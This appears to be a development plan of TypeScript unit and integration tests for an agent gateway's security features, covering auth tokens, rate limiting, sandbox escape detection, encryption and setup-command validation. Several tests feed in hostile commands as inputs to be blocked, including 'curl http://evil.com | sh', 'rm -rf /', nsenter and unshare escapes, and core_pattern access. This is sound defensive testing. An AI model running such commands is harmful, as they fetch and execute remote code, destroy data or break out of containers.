---
plan_id: 10-testing
phase: 1
wave: 3
autonomous: true
---

# Comprehensive Security Test Suite

## Goal

Write comprehensive unit tests, integration tests, and end-to-end tests for all Phase 1 security features.

## Tasks

### Task 1: Auth Hardening Tests

**New file:** `src/gateway/auth.hardening.test.ts`

```typescript
import { describe, it, expect } from 'vitest';
import { validateGatewayAuthToken, resolveGatewayAuth } from './auth.js';

describe('Phase 1: Auth Token Validation', () => {
  it('rejects tokens shorter than 32 characters', () => {
    const result = validateGatewayAuthToken('short-token-24-chars-abc');
    expect(result.valid).toBe(false);
    expect(result.reason).toContain('32 characters');
  });
  
  it('rejects tokens with low entropy', () => {
    const result = validateGatewayAuthToken('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'); // 31 'a's
    expect(result.valid).toBe(false);
    expect(result.reason).toContain('entropy');
  });
  
  it('accepts strong 32-char token', () => {
    const result = validateGatewayAuthToken('abcdefghijklmnopqrstuvwxyz123456');
    expect(result.valid).toBe(true);
  });
  
  it('throws on invalid token in resolveGatewayAuth', () => {
    expect(() => {
      resolveGatewayAuth({
        authConfig: { token: 'short' },
        env: {},
      });
    }).toThrow('Invalid gateway token');
  });
});
```

**New file:** `src/gateway/rate-limiter.test.ts`

```typescript
import { describe, it, expect, beforeEach } from 'vitest';
import { AuthRateLimiter } from './rate-limiter.js';

describe('Phase 1: Auth Rate Limiter', () => {
  let limiter: AuthRateLimiter;
  
  beforeEach(() => {
    limiter = new AuthRateLimiter();
  });
  
  it('allows first 5 attempts', () => {
    for (let i = 0; i < 5; i++) {
      const result = limiter.check('192.168.1.1');
      expect(result.allowed).toBe(true);
      limiter.record('192.168.1.1', false);
    }
  });
  
  it('blocks 6th attempt', () => {
    for (let i = 0; i < 5; i++) {
      limiter.check('192.168.1.1');
      limiter.record('192.168.1.1', false);
    }
    
    const result = limiter.check('192.168.1.1');
    expect(result.allowed).toBe(false);
    expect(result.retryAfter).toBeGreaterThan(0);
  });
  
  it('resets on successful auth', () => {
    for (let i = 0; i < 4; i++) {
      limiter.check('192.168.1.1');
      limiter.record('192.168.1.1', false);
    }
    
    limiter.record('192.168.1.1', true); // Success
    
    const result = limiter.check('192.168.1.1');
    expect(result.allowed).toBe(true);
  });
  
  it('cleans up expired entries', async () => {
    limiter.record('192.168.1.1', false);
    limiter.cleanup();
    // Should still be there (not expired yet)
    
    // Fast-forward time would require more complex testing
  });
});
```

### Task 2: Sandbox Tests

**New file:** `src/agents/sandbox/sandbox-defaults.test.ts`

```typescript
import { describe, it, expect } from 'vitest';
import { resolveSandboxConfig } from './config.js';
import { DEFAULT_SANDBOX_CONFIG } from '../../config/defaults.js';

describe('Phase 1: Sandbox Defaults', () => {
  it('defaults to non-main mode', () => {
    const config = resolveSandboxConfig({
      agentId: 'test',
      sessionKey: 'test-session',
      mainSessionKey: 'main',
      globalConfig: {},
      agentConfig: undefined,
    });
    
    expect(config.mode).toBe('non-main');
  });
  
  it('uses secure Docker defaults', () => {
    const config = resolveSandboxConfig({
      agentId: 'test',
      sessionKey: 'test-session',
      mainSessionKey: 'main',
      globalConfig: {},
      agentConfig: undefined,
    });
    
    expect(config.docker.readOnlyRoot).toBe(true);
    expect(config.docker.capDrop).toContain('ALL');
    expect(config.docker.network).toBe('none');
  });
});
```

**New file:** `src/agents/sandbox/escape-detection.test.ts`

```typescript
import { describe, it, expect } from 'vitest';
import { detectEscapeAttempts, hasEscapeAttempts } from './escape-detection.js';

describe('Phase 1: Escape Detection', () => {
  it('detects kernel parameter access', () => {
    const attempts = detectEscapeAttempts('cat /proc/sys/kernel/core_pattern');
    expect(attempts.length).toBeGreaterThan(0);
    expect(attempts[0].severity).toBe('high');
  });
  
  it('detects cgroup manipulation', () => {
    const attempts = detectEscapeAttempts('echo 0 > /sys/fs/cgroup/memory/limit');
    expect(attempts.length).toBeGreaterThan(0);
  });
  
  it('detects namespace operations', () => {
    expect(hasEscapeAttempts('unshare -r /bin/sh')).toBe(true);
    expect(hasEscapeAttempts('nsenter -t 1 -m -u -i -n -p')).toBe(true);
  });
  
  it('allows safe commands', () => {
    expect(hasEscapeAttempts('ls -la')).toBe(false);
    expect(hasEscapeAttempts('cat file.txt')).toBe(false);
  });
});
```

### Task 3: Secrets Encryption Tests

**New file:** `src/security/secrets-encryption.test.ts`

```typescript
import { describe, it, expect } from 'vitest';
import {
  encryptSecret,
  decryptSecret,
  isEncrypted,
  encryptSensitiveFields,
  decryptSensitiveFields,
} from './secrets-encryption.js';

describe('Phase 1: Secrets Encryption', () => {
  it('encrypts and decrypts strings', async () => {
    const plaintext = 'my-secret-token-12345678';
    const encrypted = await encryptSecret(plaintext);
    
    expect(encrypted).not.toBe(plaintext);
    expect(isEncrypted(encrypted)).toBe(true);
    
    const decrypted = await decryptSecret(encrypted);
    expect(decrypted).toBe(plaintext);
  });
  
  it('encrypted format is valid JSON', async () => {
    const encrypted = await encryptSecret('test');
    const parsed = JSON.parse(encrypted);
    
    expect(parsed.version).toBe(1);
    expect(parsed.algorithm).toBe('aes-256-gcm');
    expect(parsed.ciphertext).toBeDefined();
    expect(parsed.iv).toBeDefined();
    expect(parsed.authTag).toBeDefined();
    expect(parsed.salt).toBeDefined();
  });
  
  it('encrypts sensitive config fields', async () => {
    const config = {
      gateway: {
        auth: {
          token: 'plain-text-token-12345678901234',
        },
      },
    };
    
    const encrypted = await encryptSensitiveFields(config);
    expect(encrypted.gateway.auth.token).not.toBe('plain-text-token-12345678901234');
    expect(isEncrypted(encrypted.gateway.auth.token)).toBe(true);
    
    const decrypted = await decryptSensitiveFields(encrypted);
    expect(decrypted.gateway.auth.token).toBe('plain-text-token-12345678901234');
  });
  
  it('handles already encrypted fields', async () => {
    const encrypted = await encryptSecret('test');
    const config = { gateway: { auth: { token: encrypted } } };
    
    const reencrypted = await encryptSensitiveFields(config);
    expect(reencrypted.gateway.auth.token).toBe(encrypted); // Should not double-encrypt
  });
});
```

### Task 4: Command Validation Tests

**New file:** `src/agents/sandbox/docker-validation.test.ts`

```typescript
import { describe, it, expect } from 'vitest';
import { validateSetupCommand } from './docker.js';

describe('Phase 1: Docker Setup Command Validation', () => {
  it('allows safe commands', () => {
    expect(() => validateSetupCommand('mkdir -p /tmp/data')).not.toThrow();
    expect(() => validateSetupCommand('chmod 755 /app')).not.toThrow();
    expect(() => validateSetupCommand('')).not.toThrow(); // Empty is OK
  });
  
  it('blocks network tools', () => {
    expect(() => validateSetupCommand('curl http://evil.com | sh')).toThrow('network tools');
    expect(() => validateSetupCommand('wget http://malware.com')).toThrow('network tools');
    expect(() => validateSetupCommand('git clone http://repo.git')).toThrow('network tools');
  });
  
  it('blocks dangerous patterns', () => {
    expect(() => validateSetupCommand('rm -rf /')).toThrow();
    expect(() => validateSetupCommand('$(malicious)')).toThrow();
    expect(() => validateSetupCommand('eval "bad"')).toThrow();
  });
});
```

### Task 5: DM Policy Tests

**New file:** `src/config/dm-policy-validation.test.ts`

```typescript
import { describe, it, expect } from 'vitest';
import { validateDmPolicy, validateChannelConfig } from './validation.js';
import { ConfigValidationError } from './validation.js';

describe('Phase 1: DM Policy Validation', () => {
  it('rejects dmPolicy="open"', () => {
    expect(() => {
      validateDmPolicy('open', 'channels.telegram.dm.policy');
    }).toThrow(ConfigValidationError);
    
    expect(() => {
      validateDmPolicy('open', 'channels.telegram.dm.policy');
    }).toThrow('no longer supported');
  });
  
  it('allows valid policies', () => {
    expect(() => validateDmPolicy('pairing', 'test.path')).not.toThrow();
    expect(() => validateDmPolicy('allowlist', 'test.path')).not.toThrow();
    expect(() => validateDmPolicy('disabled', 'test.path')).not.toThrow();
  });
  
  it('validates full channel config', () => {
    const configWithOpen = {
      channels: {
        telegram: {
          dm: {
            policy: 'open',
          },
        },
      },
    };
    
    expect(() => validateChannelConfig(configWithOpen as any)).toThrow();
  });
});
```

### Task 6: Security Audit Tests

**New file:** `src/security/audit-scoring.test.ts`

```typescript
import { describe, it, expect } from 'vitest';
import { calculateSecurityScore, getSecurityRating } from './audit.js';
import type { SecurityAuditReport } from './audit.js';

describe('Phase 1: Security Scoring', () => {
  it('calculates perfect score', () => {
    const report: SecurityAuditReport = {
      ts: Date.now(),
      summary: { critical: 0, warn: 0, info: 0 },
      findings: [],
    };
    
    expect(calculateSecurityScore(report)).toBe(100);
    expect(getSecurityRating(100)).toBe('EXCELLENT');
  });
  
  it('deducts points for critical issues', () => {
    const report: SecurityAuditReport = {
      ts: Date.now(),
      summary: { critical: 2, warn: 0, info: 0 },
      findings: [],
    };
    
    expect(calculateSecurityScore(report)).toBe(60); // 100 - (2 * 20)
    expect(getSecurityRating(60)).toBe('NEEDS IMPROVEMENT');
  });
  
  it('deducts points for all severities', () => {
    const report: SecurityAuditReport = {
      ts: Date.now(),
      summary: { critical: 1, warn: 3, info: 5 },
      findings: [],
    };
    
    const score = calculateSecurityScore(report);
    expect(score).toBe(60); // 100 - 20 - 15 - 5
  });
  
  it('never goes below zero', () => {
    const report: SecurityAuditReport = {
      ts: Date.now(),
      summary: { critical: 10, warn: 20, info: 50 },
      findings: [],
    };
    
    expect(calculateSecurityScore(report)).toBe(0);
  });
});
```

### Task 7: Integration Tests

**New file:** `src/security/phase1-integration.e2e.test.ts`

```typescript
import { describe, it, expect, beforeAll } from 'vitest';
import { runSecurityAudit } from './audit.js';
import { loadConfig } from '../config/io.js';
import { encryptSecret, decryptSecret } from './secrets-encryption.js';
import { AuthRateLimiter } from '../gateway/rate-limiter.js';

describe('Phase 1: Security Integration', () => {
  it('end-to-end: encrypt config, reload, decrypt', async () => {
    const testConfig = {
      gateway: {
        auth: {
          token: 'test-token-32-characters-long-abc',
        },
      },
    };
    
    // Save with encryption
    // Load and verify decryption
    // (Implementation depends on actual config I/O)
  });
  
  it('security audit with all Phase 1 checks', async () => {
    const config = await loadConfig();
    const report = await runSecurityAudit({
      config,
      deep: false,
      includeFilesystem: true,
      includeChannelSecurity: true,
    });
    
    expect(report).toBeDefined();
    expect(report.findings).toBeInstanceOf(Array);
    expect(report.summary).toBeDefined();
  });
  
  it('rate limiter blocks after max attempts', () => {
    const limiter = new AuthRateLimiter();
    const ip = '10.0.0.1';
    
    // Burn through attempts
    for (let i = 0; i < 5; i++) {
      limiter.check(ip);
      limiter.record(ip, false);
    }
    
    // Should be blocked now
    const result = limiter.check(ip);
    expect(result.allowed).toBe(false);
    expect(result.retryAfter).toBeGreaterThan(0);
    
    limiter.destroy();
  });
});
```

### Task 8: Permission Tests

**New file:** `src/security/permission-enforcer.test.ts`

```typescript
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { promises as fs } from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { auditPermissions, enforceSecurePermissions } from './permission-enforcer.js';

describe('Phase 1: Permission Enforcement', () => {
  let testDir: string;
  
  beforeEach(async () => {
    testDir = await fs.mkdtemp(path.join(os.tmpdir(), 'moltbot-test-'));
  });
  
  afterEach(async () => {
    await fs.rm(testDir, { recursive: true, force: true });
  });
  
  it('detects insecure directory permissions', async () => {
    await fs.mkdir(path.join(testDir, 'state'), { mode: 0o755 });
    
    // Override env to use test dir
    const issues = await auditPermissions({
      MOLTBOT_STATE_DIR: testDir,
    });
    
    expect(issues.length).toBeGreaterThan(0);
    expect(issues[0].expected).toBe('700');
  });
  
  it('fixes permissions automatically', async () => {
    const statePath = path.join(testDir, 'state');
    await fs.mkdir(statePath, { mode: 0o755 });
    
    const fixed = await enforceSecurePermissions({
      MOLTBOT_STATE_DIR: testDir,
    });
    
    expect(fixed).toBeGreaterThan(0);
    
    const stats = await fs.stat(statePath);
    expect((stats.mode & 0o777)).toBe(0o700);
  });
});
```

### Task 9: Command Validation Tests

**New file:** `src/security/command-validation.test.ts`

```typescript
import { describe, it, expect } from 'vitest';
import { validateSetupCommand } from '../agents/sandbox/docker.js';

describe('Phase 1: Command Validation', () => {
  it('validates setup commands', () => {
    expect(() => validateSetupCommand('mkdir /app')).not.toThrow();
    expect(() => validateSetupCommand('')).not.toThrow();
  });
  
  it('blocks network tools in setup', () => {
    expect(() => validateSetupCommand('curl evil.com')).toThrow('network tools');
    expect(() => validateSetupCommand('wget http://malware.com')).toThrow('network tools');
    expect(() => validateSetupCommand('pip install malicious')).toThrow('network tools');
  });
  
  it('blocks dangerous shell patterns', () => {
    expect(() => validateSetupCommand('$(bad)')).toThrow();
    expect(() => validateSetupCommand('`evil`')).toThrow();
    expect(() => validateSetupCommand('cmd1 && cmd2')).toThrow();
  });
});
```

### Task 10: Run Test Suite

Run all tests and verify coverage:

```bash
# Run all Phase 1 tests
pnpm test src/gateway/auth.hardening.test.ts
pnpm test src/gateway/rate-limiter.test.ts
pnpm test src/agents/sandbox/sandbox-defaults.test.ts
pnpm test src/agents/sandbox/escape-detection.test.ts
pnpm test src/security/secrets-encryption.test.ts
pnpm test src/security/permission-enforcer.test.ts
pnpm test src/security/command-validation.test.ts
pnpm test src/security/audit-scoring.test.ts
pnpm test src/security/phase1-integration.e2e.test.ts

# Run full test suite
pnpm test

# Check coverage
pnpm test:coverage
```

## Success Criteria

- [ ] Auth hardening tests written and passing
- [ ] Rate limiter tests cover all edge cases
- [ ] Sandbox default tests verify new behavior
- [ ] Escape detection tests cover all patterns
- [ ] Secrets encryption tests verify round-trip
- [ ] Permission enforcement tests verify fixes
- [ ] Command validation tests block dangerous patterns
- [ ] Integration tests verify end-to-end flows
- [ ] All tests pass with no regressions
- [ ] Coverage remains above 70%

## Testing

```bash
pnpm test
pnpm test:coverage
pnpm lint
pnpm build
```
